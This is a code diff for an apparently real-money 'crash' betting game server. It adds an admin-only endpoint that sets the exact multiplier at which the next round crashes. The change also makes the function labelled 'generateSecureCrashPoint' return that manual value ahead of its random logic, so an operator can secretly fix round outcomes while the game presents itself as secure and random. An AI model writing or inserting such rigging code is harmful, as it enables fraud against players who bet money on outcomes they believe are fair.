@@ -153,6 +153,7 @@ app.get('/api/history/:username', async (req, res) => {
         res.status(500).json({ error: 'Failed to fetch history.' });
     }
 });
+
 // ==========================================
 // --- ADMIN API ROUTES ---
 // ==========================================
@@ -200,6 +201,21 @@ app.delete('/api/admin/users/:id', verifyAdmin, async (req, res) => {
         res.status(500).json({ error: 'Failed to delete user.' });
     }
 });
+
+// OVERRIDE ENGINE ENDPOINT
+app.post('/api/admin/override', verifyAdmin, (req, res) => {
+    try {
+        const { multiplier } = req.body;
+        const val = parseFloat(multiplier);
+        if (isNaN(val) || val < 1.0) return res.status(400).json({ error: 'Invalid multiplier' });
+        
+        manualCrashPoint = val; // Set the global override variable
+        res.json({ message: `Success! The next round will crash exactly at ${val.toFixed(2)}x` });
+    } catch (err) {
+        res.status(500).json({ error: 'Failed to set override' });
+    }
+});
+
 // ==========================================
 // --- SECURE GAME ENGINE STATE ---
 // ==========================================
@@ -210,10 +226,21 @@ let history = [60.16, 36.15, 54.63, 3.55, 4.18, 22.87, 25.18, 83.12, 44.75];
 let roundCounter = 85261;
 let flightTickInterval;
 
+// Override variable
+let manualCrashPoint = null; 
+
 // Tracks active bets using a composite key: { "socketId_betIndex": { userId, username, amount, betIndex } }
 let activeRoundBets = {}; 
 
 function generateSecureCrashPoint(hasRealBets) {
+    // 1. CHECK FOR ADMIN OVERRIDE FIRST
+    if (manualCrashPoint !== null) {
+        const override = manualCrashPoint;
+        manualCrashPoint = null; // Reset it immediately so it only affects ONE round
+        return override;
+    }
+
+    // 2. NORMAL RANDOM LOGIC
     const hash = crypto.randomBytes(32).toString('hex');
     const h = parseInt(hash.slice(0, 13), 16);
     const e = Math.pow(2, 52);
